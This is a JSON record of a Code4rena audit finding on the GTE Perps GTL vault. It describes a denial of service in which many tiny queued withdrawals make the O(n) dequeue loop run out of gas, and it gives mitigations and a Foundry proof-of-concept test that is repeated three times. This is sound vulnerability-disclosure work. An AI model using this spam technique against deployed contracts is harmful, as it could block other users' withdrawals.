@@ -1,0 +1,130 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "GTE Perps and Launchpad_gtn2Umg6KsC",
+    "audit_uid": "gtn2Umg6KsC",
+    "requested_submission_uid": "LG47BL6gFZR",
+    "requested_finding_uid": "Xrgn2WT5sTG",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/GTE_Perps_and_Launchpad_gtn2Umg6KsC/20260618_145637/findings.json",
+    "source_submission_uid": "LG47BL6gFZR",
+    "source_finding_uid": "Xrgn2WT5sTG",
+    "original_report_path": "GTE Perps and Launchpad_gtn2Umg6KsC\\high_valid_LG47BL6gFZR.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "LG47BL6gFZR",
+  "finding_uid": "Xrgn2WT5sTG",
+  "finding_number": "16",
+  "title": "GTL vault can be gas overwhelmed and DoSed because of lack of input amount check",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "KonstantinVelev",
+  "body": "## Finding description and impact\n\nThe issue occurs because of the ability for a user to queue as many withdraws as he wants with what amount of share he wants.\n\nBasically the user is able to withdrawal his deposited amount in the GTL vault by providing amount of shares that he wants just by calling [`queueWithdrawal`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L101C3-L112C6). This will put in the array of queued withdraws a brand new one that should be processed by the admin:\n\n```solidity\n        _queuedWithdrawal[id] = Withdrawal(msg.sender, shares);\n```\n\nAfter that for the queued withdraws there are two exits:\n\n- 1. To be processed and executed\n- 2. To be canceled\n\nThe issue lies it that a malicious user can start spamming the vault, by sending a really small amount of shares(1 share) for withdrawal and all these spam requests will be stored in `_queuedWithdrawal` which makes the array really expensive for looping and maintaining. \n\nThis leads to two scenarios.\n - 1. If the exit for these queued withdrawals is (1) and they should be processed the admin should process more way 'batches' in order to safely process the withdrawals otherwise he can run out of gas and revert the tx.\n - 2. The attacker can cancel all his queued withdrawal, which calling the [`_dequeue()`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L271C4-L283C6) function. The function itself expects the id of the withdrawal request as parameter and it looping trough all the queued withdraws, where it checks if the withdrawal id matches the input one. Looping trough all queued request will looping so much times that can run out of gas and eventually DoS the contract because of the amount of the requests.\n\nNote that whatever of the scenarios is executed there is no loss for the attacker, so he can do that again and again and again.\n\n## Impact\n\nThe impact is DoS the contract which can prevent other users to withdrawal their stakes. Since the attack loss nothing to do that the likelihood can be also high.\n\n## Recommended mitigation steps\n\nThere are several ways to mitigate this:\n\n - Add check for minimum amount of shares to withdrawal, this will help for decreasing the amount of the withdrawals\n - Add time interval for queued new queries and prevent the user to queue again if the interval is not passed.\n - Refactor the logic and introduce mapping that holds user address -> all queued request, this way you can implement 'batch' logic.",
+  "proof_of_concept": "Please add following test in PerpManagerTestBase.sol. On the test you can observe the behavior and gas expenses.\n\n```solidity\n    function test_GTL_WithdrawalQueue_DoS_Attack() public {\n        // Setup: User deposits USDC into GTL vault\n        uint256 depositAmount = 1000e18; // 1000 USDC\n        uint256 totalSharesToWithdraw = 100e18; // 100 shares\n        \n        // Mint USDC for attacker\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(attacker);\n        usdc.mint(attacker, depositAmount);\n        usdc.approve(address(gtl), depositAmount);\n        \n        // Deposit into GTL vault\n        uint256 sharesReceived = gtl.deposit(depositAmount, attacker);\n        vm.stopPrank();\n        \n        console.log(\"Attacker deposited %s USDC and received %s GTL shares\", depositAmount, sharesReceived);\n        \n        // Verify attacker has enough shares for the attack\n        assertGe(sharesReceived, totalSharesToWithdraw, \"Attacker doesn't have enough shares\");\n        \n        // DoS Attack: Queue 500 small withdrawal requests instead of 1 large one\n        uint256 numRequests = 500;\n        uint256 sharesPerRequest = totalSharesToWithdraw / numRequests; // 0.2 shares per request\n        uint256[] memory withdrawalIds = new uint256[](numRequests);\n        \n        vm.startPrank(attacker);\n        for (uint256 i = 0; i < numRequests; i++) {\n            // Each request withdraws only 0.2 shares\n            uint256 id = gtl.queueWithdrawal(sharesPerRequest);\n            withdrawalIds[i] = id;\n        }\n        vm.stopPrank();\n        \n        // Verify all requests are queued\n        uint256[] memory queue = gtl.getWithdrawalQueue();\n        \n        console.log(\"Attacker queued %s withdrawal requests of %s shares each\", numRequests, sharesPerRequest);\n        console.log(\"Total withdrawal queue length: %s\", queue.length);\n        \n        // Verify attacker's queued shares\n        uint256 attackerQueuedShares = gtl.getQueuedShares(attacker);\n        assertEq(attackerQueuedShares, totalSharesToWithdraw, \"Total queued shares mismatch\");\n        \n        // Simulate admin trying to process withdrawals\n        // This should be gas-intensive due to _dequeue() operations\n        address adminOperator = makeAddr(\"adminOperator\");\n        \n        // Grant admin role to operator\n        vm.prank(admin);\n        gtl.grantAdminRole(adminOperator);\n        \n        vm.startPrank(adminOperator);\n        uint256 gasStart = gasleft();\n        \n        // Process all 500 withdrawals - this will be expensive due to _dequeue operations\n        gtl.processWithdrawals(numRequests);\n        \n        uint256 gasUsed = gasStart - gasleft();\n        vm.stopPrank();\n        \n        console.log(\"Gas used to process %s withdrawal requests: %s\", numRequests, gasUsed);\n        \n        // Verify withdrawals were processed\n        assertEq(gtl.getWithdrawalQueue().length, 0, \"Withdrawal queue should be empty\");\n        assertEq(gtl.getQueuedShares(attacker), 0, \"Attacker should have no queued shares\");\n        \n        // Verify attacker received USDC\n        uint256 attackerUSDCBalance = usdc.balanceOf(attacker);\n        console.log(\"Attacker's final USDC balance: %s\", attackerUSDCBalance);\n        \n        // The attack demonstrates that:\n        // 1. Users can spam many small withdrawal requests\n        // 2. Each _dequeue() operation is O(n) where n is queue length\n        // 3. Processing 100 withdrawals requires 100 * O(n) operations = O(n²)\n        // 4. This can make withdrawal processing prohibitively expensive\n        \n        // Expected behavior: Attack should succeed but be gas-expensive\n        // Note: Gas costs may vary based on Solidity optimizations\n        assertTrue(gasUsed > 2000000, \"DoS attack should be gas-expensive\"); // > 2M gas for 500 requests\n        \n        // Additional check: Each withdrawal should cost significantly more than simple transfer\n        uint256 avgGasPerWithdrawal = gasUsed / numRequests;\n        console.log(\"Average gas per withdrawal: %s\", avgGasPerWithdrawal);\n    }\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L101-L112",
+    "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L271-L283"
+  ],
+  "source_record": {
+    "project_id": "gtn2Umg6KsC",
+    "submission_index": "358",
+    "api_submission_id": "",
+    "uid": "LG47BL6gFZR",
+    "number": "358",
+    "title": "GTL vault can be gas overwhelmed and DoSed because of lack of input amount check",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "KonstantinVelev",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L101-L112",
+      "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L271-L283"
+    ],
+    "body": "## Finding description and impact\n\nThe issue occurs because of the ability for a user to queue as many withdraws as he wants with what amount of share he wants.\n\nBasically the user is able to withdrawal his deposited amount in the GTL vault by providing amount of shares that he wants just by calling [`queueWithdrawal`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L101C3-L112C6). This will put in the array of queued withdraws a brand new one that should be processed by the admin:\n\n```solidity\n        _queuedWithdrawal[id] = Withdrawal(msg.sender, shares);\n```\n\nAfter that for the queued withdraws there are two exits:\n\n- 1. To be processed and executed\n- 2. To be canceled\n\nThe issue lies it that a malicious user can start spamming the vault, by sending a really small amount of shares(1 share) for withdrawal and all these spam requests will be stored in `_queuedWithdrawal` which makes the array really expensive for looping and maintaining. \n\nThis leads to two scenarios.\n - 1. If the exit for these queued withdrawals is (1) and they should be processed the admin should process more way 'batches' in order to safely process the withdrawals otherwise he can run out of gas and revert the tx.\n - 2. The attacker can cancel all his queued withdrawal, which calling the [`_dequeue()`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L271C4-L283C6) function. The function itself expects the id of the withdrawal request as parameter and it looping trough all the queued withdraws, where it checks if the withdrawal id matches the input one. Looping trough all queued request will looping so much times that can run out of gas and eventually DoS the contract because of the amount of the requests.\n\nNote that whatever of the scenarios is executed there is no loss for the attacker, so he can do that again and again and again.\n\n## Impact\n\nThe impact is DoS the contract which can prevent other users to withdrawal their stakes. Since the attack loss nothing to do that the likelihood can be also high.\n\n## Recommended mitigation steps\n\nThere are several ways to mitigate this:\n\n - Add check for minimum amount of shares to withdrawal, this will help for decreasing the amount of the withdrawals\n - Add time interval for queued new queries and prevent the user to queue again if the interval is not passed.\n - Refactor the logic and introduce mapping that holds user address -> all queued request, this way you can implement 'batch' logic.",
+    "proof_of_concept": "Please add following test in PerpManagerTestBase.sol. On the test you can observe the behavior and gas expenses.\n\n```solidity\n    function test_GTL_WithdrawalQueue_DoS_Attack() public {\n        // Setup: User deposits USDC into GTL vault\n        uint256 depositAmount = 1000e18; // 1000 USDC\n        uint256 totalSharesToWithdraw = 100e18; // 100 shares\n        \n        // Mint USDC for attacker\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(attacker);\n        usdc.mint(attacker, depositAmount);\n        usdc.approve(address(gtl), depositAmount);\n        \n        // Deposit into GTL vault\n        uint256 sharesReceived = gtl.deposit(depositAmount, attacker);\n        vm.stopPrank();\n        \n        console.log(\"Attacker deposited %s USDC and received %s GTL shares\", depositAmount, sharesReceived);\n        \n        // Verify attacker has enough shares for the attack\n        assertGe(sharesReceived, totalSharesToWithdraw, \"Attacker doesn't have enough shares\");\n        \n        // DoS Attack: Queue 500 small withdrawal requests instead of 1 large one\n        uint256 numRequests = 500;\n        uint256 sharesPerRequest = totalSharesToWithdraw / numRequests; // 0.2 shares per request\n        uint256[] memory withdrawalIds = new uint256[](numRequests);\n        \n        vm.startPrank(attacker);\n        for (uint256 i = 0; i < numRequests; i++) {\n            // Each request withdraws only 0.2 shares\n            uint256 id = gtl.queueWithdrawal(sharesPerRequest);\n            withdrawalIds[i] = id;\n        }\n        vm.stopPrank();\n        \n        // Verify all requests are queued\n        uint256[] memory queue = gtl.getWithdrawalQueue();\n        \n        console.log(\"Attacker queued %s withdrawal requests of %s shares each\", numRequests, sharesPerRequest);\n        console.log(\"Total withdrawal queue length: %s\", queue.length);\n        \n        // Verify attacker's queued shares\n        uint256 attackerQueuedShares = gtl.getQueuedShares(attacker);\n        assertEq(attackerQueuedShares, totalSharesToWithdraw, \"Total queued shares mismatch\");\n        \n        // Simulate admin trying to process withdrawals\n        // This should be gas-intensive due to _dequeue() operations\n        address adminOperator = makeAddr(\"adminOperator\");\n        \n        // Grant admin role to operator\n        vm.prank(admin);\n        gtl.grantAdminRole(adminOperator);\n        \n        vm.startPrank(adminOperator);\n        uint256 gasStart = gasleft();\n        \n        // Process all 500 withdrawals - this will be expensive due to _dequeue operations\n        gtl.processWithdrawals(numRequests);\n        \n        uint256 gasUsed = gasStart - gasleft();\n        vm.stopPrank();\n        \n        console.log(\"Gas used to process %s withdrawal requests: %s\", numRequests, gasUsed);\n        \n        // Verify withdrawals were processed\n        assertEq(gtl.getWithdrawalQueue().length, 0, \"Withdrawal queue should be empty\");\n        assertEq(gtl.getQueuedShares(attacker), 0, \"Attacker should have no queued shares\");\n        \n        // Verify attacker received USDC\n        uint256 attackerUSDCBalance = usdc.balanceOf(attacker);\n        console.log(\"Attacker's final USDC balance: %s\", attackerUSDCBalance);\n        \n        // The attack demonstrates that:\n        // 1. Users can spam many small withdrawal requests\n        // 2. Each _dequeue() operation is O(n) where n is queue length\n        // 3. Processing 100 withdrawals requires 100 * O(n) operations = O(n²)\n        // 4. This can make withdrawal processing prohibitively expensive\n        \n        // Expected behavior: Attack should succeed but be gas-expensive\n        // Note: Gas costs may vary based on Solidity optimizations\n        assertTrue(gasUsed > 2000000, \"DoS attack should be gas-expensive\"); // > 2M gas for 500 requests\n        \n        // Additional check: Each withdrawal should cost significantly more than simple transfer\n        uint256 avgGasPerWithdrawal = gasUsed / numRequests;\n        console.log(\"Average gas per withdrawal: %s\", avgGasPerWithdrawal);\n    }\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/gtn2Umg6KsC/submissions/358",
+    "raw": {
+      "auditUid": "gtn2Umg6KsC",
+      "createdAt": "2025-09-13T08:27:50.745Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "5nJsfCizE2E",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-08T15:25:18.288Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "Xrgn2WT5sTG"
+        },
+        {
+          "uid": "UyQ6jEzeznB",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-15T10:14:35.599Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "LG47BL6gFZR",
+          "findingUid": null
+        },
+        {
+          "uid": "troGSx9qyTu",
+          "userUid": "nR9vNzVqk2o",
+          "userAuditRole": "sponsor",
+          "createdAt": "2025-10-20T22:29:25.800Z",
+          "type": "validity",
+          "value": "fixed",
+          "submissionUid": null,
+          "findingUid": "Xrgn2WT5sTG"
+        },
+        {
+          "uid": "LoeG7ip9wiK",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-10T12:56:56.314Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "Xrgn2WT5sTG"
+        }
+      ],
+      "finding": {
+        "uid": "Xrgn2WT5sTG",
+        "number": 16,
+        "duplicates": 34
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2025-11-10T12:56:56.314Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "GTL vault can be gas overwhelmed and DoSed because of lack of input amount check",
+      "uid": "LG47BL6gFZR",
+      "updatedAt": "2025-09-13T08:27:50.745Z",
+      "user": {
+        "uid": "zvSigFwE5SH",
+        "handle": "KonstantinVelev"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nThe issue occurs because of the ability for a user to queue as many withdraws as he wants with what amount of share he wants.\n\nBasically the user is able to withdrawal his deposited amount in the GTL vault by providing amount of shares that he wants just by calling [`queueWithdrawal`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L101C3-L112C6). This will put in the array of queued withdraws a brand new one that should be processed by the admin:\n\n```solidity\n        _queuedWithdrawal[id] = Withdrawal(msg.sender, shares);\n```\n\nAfter that for the queued withdraws there are two exits:\n\n- 1. To be processed and executed\n- 2. To be canceled\n\nThe issue lies it that a malicious user can start spamming the vault, by sending a really small amount of shares(1 share) for withdrawal and all these spam requests will be stored in `_queuedWithdrawal` which makes the array really expensive for looping and maintaining. \n\nThis leads to two scenarios.\n - 1. If the exit for these queued withdrawals is (1) and they should be processed the admin should process more way 'batches' in order to safely process the withdrawals otherwise he can run out of gas and revert the tx.\n - 2. The attacker can cancel all his queued withdrawal, which calling the [`_dequeue()`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L271C4-L283C6) function. The function itself expects the id of the withdrawal request as parameter and it looping trough all the queued withdraws, where it checks if the withdrawal id matches the input one. Looping trough all queued request will looping so much times that can run out of gas and eventually DoS the contract because of the amount of the requests.\n\nNote that whatever of the scenarios is executed there is no loss for the attacker, so he can do that again and again and again.\n\n## Impact\n\nThe impact is DoS the contract which can prevent other users to withdrawal their stakes. Since the attack loss nothing to do that the likelihood can be also high.\n\n## Recommended mitigation steps\n\nThere are several ways to mitigate this:\n\n - Add check for minimum amount of shares to withdrawal, this will help for decreasing the amount of the withdrawals\n - Add time interval for queued new queries and prevent the user to queue again if the interval is not passed.\n - Refactor the logic and introduce mapping that holds user address -> all queued request, this way you can implement 'batch' logic.",
+      "proofOfConcept": "Please add following test in PerpManagerTestBase.sol. On the test you can observe the behavior and gas expenses.\n\n```solidity\n    function test_GTL_WithdrawalQueue_DoS_Attack() public {\n        // Setup: User deposits USDC into GTL vault\n        uint256 depositAmount = 1000e18; // 1000 USDC\n        uint256 totalSharesToWithdraw = 100e18; // 100 shares\n        \n        // Mint USDC for attacker\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(attacker);\n        usdc.mint(attacker, depositAmount);\n        usdc.approve(address(gtl), depositAmount);\n        \n        // Deposit into GTL vault\n        uint256 sharesReceived = gtl.deposit(depositAmount, attacker);\n        vm.stopPrank();\n        \n        console.log(\"Attacker deposited %s USDC and received %s GTL shares\", depositAmount, sharesReceived);\n        \n        // Verify attacker has enough shares for the attack\n        assertGe(sharesReceived, totalSharesToWithdraw, \"Attacker doesn't have enough shares\");\n        \n        // DoS Attack: Queue 500 small withdrawal requests instead of 1 large one\n        uint256 numRequests = 500;\n        uint256 sharesPerRequest = totalSharesToWithdraw / numRequests; // 0.2 shares per request\n        uint256[] memory withdrawalIds = new uint256[](numRequests);\n        \n        vm.startPrank(attacker);\n        for (uint256 i = 0; i < numRequests; i++) {\n            // Each request withdraws only 0.2 shares\n            uint256 id = gtl.queueWithdrawal(sharesPerRequest);\n            withdrawalIds[i] = id;\n        }\n        vm.stopPrank();\n        \n        // Verify all requests are queued\n        uint256[] memory queue = gtl.getWithdrawalQueue();\n        \n        console.log(\"Attacker queued %s withdrawal requests of %s shares each\", numRequests, sharesPerRequest);\n        console.log(\"Total withdrawal queue length: %s\", queue.length);\n        \n        // Verify attacker's queued shares\n        uint256 attackerQueuedShares = gtl.getQueuedShares(attacker);\n        assertEq(attackerQueuedShares, totalSharesToWithdraw, \"Total queued shares mismatch\");\n        \n        // Simulate admin trying to process withdrawals\n        // This should be gas-intensive due to _dequeue() operations\n        address adminOperator = makeAddr(\"adminOperator\");\n        \n        // Grant admin role to operator\n        vm.prank(admin);\n        gtl.grantAdminRole(adminOperator);\n        \n        vm.startPrank(adminOperator);\n        uint256 gasStart = gasleft();\n        \n        // Process all 500 withdrawals - this will be expensive due to _dequeue operations\n        gtl.processWithdrawals(numRequests);\n        \n        uint256 gasUsed = gasStart - gasleft();\n        vm.stopPrank();\n        \n        console.log(\"Gas used to process %s withdrawal requests: %s\", numRequests, gasUsed);\n        \n        // Verify withdrawals were processed\n        assertEq(gtl.getWithdrawalQueue().length, 0, \"Withdrawal queue should be empty\");\n        assertEq(gtl.getQueuedShares(attacker), 0, \"Attacker should have no queued shares\");\n        \n        // Verify attacker received USDC\n        uint256 attackerUSDCBalance = usdc.balanceOf(attacker);\n        console.log(\"Attacker's final USDC balance: %s\", attackerUSDCBalance);\n        \n        // The attack demonstrates that:\n        // 1. Users can spam many small withdrawal requests\n        // 2. Each _dequeue() operation is O(n) where n is queue length\n        // 3. Processing 100 withdrawals requires 100 * O(n) operations = O(n²)\n        // 4. This can make withdrawal processing prohibitively expensive\n        \n        // Expected behavior: Attack should succeed but be gas-expensive\n        // Note: Gas costs may vary based on Solidity optimizations\n        assertTrue(gasUsed > 2000000, \"DoS attack should be gas-expensive\"); // > 2M gas for 500 requests\n        \n        // Additional check: Each withdrawal should cost significantly more than simple transfer\n        uint256 avgGasPerWithdrawal = gasUsed / numRequests;\n        console.log(\"Average gas per withdrawal: %s\", avgGasPerWithdrawal);\n    }\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L101-L112,https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L271-L283",
+      "number": 358,
+      "aiExplanation": null,
+      "_index": 358
+    }
+  }
+}
